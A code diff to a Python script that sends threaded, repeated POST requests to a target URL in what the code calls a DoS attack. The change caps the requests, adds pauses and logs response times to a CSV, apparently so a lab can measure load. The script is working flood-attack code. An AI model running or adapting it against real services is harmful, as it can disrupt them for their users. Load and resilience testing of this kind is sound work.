@@ -1,14 +1,52 @@
+import csv
+import os
 import threading
+import time
 
 import requests
 
 
 def dos_request(url, payload, headers):
 
-    while True:
+    num_requests = 1000
+    project_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+    output_file = os.path.join(project_root, "Resource_Usage")
+    # create a folder to store resource usage data
+    if not os.path.exists(output_file):
+        os.makedirs(output_file)
+
+    # open the file in write mode
+    with open(
+        os.path.join(output_file, "attack_response_time.csv"), "w", encoding="utf-8"
+    ) as f:
+        writer = csv.writer(f)
+        # write the header
+        writer.writerow(["timestamp", "status_code", "response_time"])
+
+    while num_requests > 0:
         try:
-            response = requests.request("POST", url, headers=headers, data=payload)
+            # record the start time
+            start_time = time.time()
+            response = requests.request(
+                "POST", url, headers=headers, data=payload, timeout=2
+            )
+            # record the end time
+            end_time = time.time()
+            # calculate the time taken for the request
+            time_taken = (end_time - start_time) * 1000  # convert to milliseconds
+            # write the data to the file
+            with open(
+                os.path.join(output_file, "attack_response_time.csv"),
+                "a",
+                encoding="utf-8",
+                newline="",
+            ) as f:
+                writer = csv.writer(f)
+                # write the data
+                writer.writerow([time.time(), response.status_code, time_taken])
             print(f"Sending DoS request, Status Code: {response.status_code}")
+            time.sleep(0.5)  # Adjust the sleep time as needed 0.1 seconds
+            num_requests -= 1
         except Exception as e:
             print(f"An Error Occurred: {e}")
             break
@@ -43,7 +81,7 @@ def Dos_attack():
     }
 
     # number of threads for the attack
-    multi_thread = 5
+    multi_thread = 3
     thread_list = []
 
     # begin the DoS attack
@@ -53,6 +91,7 @@ def Dos_attack():
         thread = threading.Thread(target=dos_request, args=(url, payload, headers))
         thread.start()
         thread_list.append(thread)
+        time.sleep(3)
 
     for thread in thread_list:
         thread.join()
